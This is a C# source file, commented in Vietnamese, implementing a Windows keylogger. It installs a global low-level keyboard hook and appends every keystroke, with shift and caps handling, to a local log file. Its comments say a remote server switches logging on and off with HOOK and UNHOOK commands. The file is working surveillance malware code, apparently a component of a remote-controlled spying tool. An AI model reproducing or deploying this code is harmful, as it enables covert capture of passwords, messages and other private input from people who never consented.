using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace KeyLogger
{
    class appstart
    {
        public static string path = "fileKeyLog.txt"; // Đường dẫn file log
        // Cờ điều khiển: Server sẽ bật/tắt cờ này qua lệnh HOOK/UNHOOK
        public static bool IsKeyLoggingActive = false;

        // Các biến của bạn, được giữ lại để tương thích
        public static byte caps = 0, shift = 0, failed = 0;
    }

    class InterceptKeys
    {
        // --- WinAPI Imports ---
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Delegate và các biến Hook
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        // --- Hàm Callback Bắt Phím ---
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                // CHỈ XỬ LÝ KHI CỜ ĐIỀU KHIỂN ĐƯỢC BẬT (HOOK)
                if (appstart.IsKeyLoggingActive)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    Keys key = (Keys)vkCode;

                    try
                    {
                        using (StreamWriter sw = File.AppendText(appstart.path))
                        {
                            string keyPress = "";
                            if (key >= Keys.A && key <= Keys.Z)
                            {
                                // Áp dụng logic Shift/Caps
                                if (appstart.shift == 0 && appstart.caps == 0) keyPress = key.ToString().ToLower();
                                else keyPress = key.ToString().ToUpper();
                            }
                            else if (key == Keys.Enter)
                            {
                                keyPress = "[ENTER]" + Environment.NewLine;
                            }
                            else if (key == Keys.Space)
                            {
                                keyPress = " "; // Khoảng trắng, không phải [SPACE]
                            }
                            else if (key == Keys.LShiftKey || key == Keys.RShiftKey)
                            {
                                appstart.shift = 1;
                                keyPress = "[SHIFT]";
                            }
                            else if (key == Keys.Back)
                            {
                                keyPress = "[BACKSPACE]";
                            }
                            else if (key == Keys.Capital)
                            {
                                if (appstart.caps == 0) appstart.caps = 1;
                                else appstart.caps = 0;
                                keyPress = "[CAPSLOCK]";
                            }
                            // Thêm các phím đặc biệt khác vào đây
                            else
                            {
                                // Ghi lại các phím khác dưới dạng [Tên phím]
                                keyPress = $"[{key.ToString()}]";
                            }

                            sw.Write(keyPress);
                        }
                    }
                    catch (Exception)
                    {
                        // Bỏ qua lỗi I/O nếu có
                    }
                    appstart.shift = 0; // Reset shift sau mỗi phím
                }
            }

            // **Quan trọng**: Luôn chuyển sự kiện đến Hook tiếp theo
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // Hàm chạy Keylogger trong một Thread riêng
        public static void startKLog()
        {
            // Cài đặt Hook
            using (var process = Process.GetCurrentProcess())
            {
                var mainModule = process.MainModule;

                if (mainModule == null)
                    throw new InvalidOperationException("Không lấy được MainModule");

                _hookID = SetWindowsHookEx(
                    WH_KEYBOARD_LL,
                    _proc,
                    GetModuleHandle(mainModule.ModuleName),
                    0
                );
            }


        }

        // Hàm gỡ bỏ Hook hoàn toàn
        public static void stopKLog()
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
            }
        }
    }
}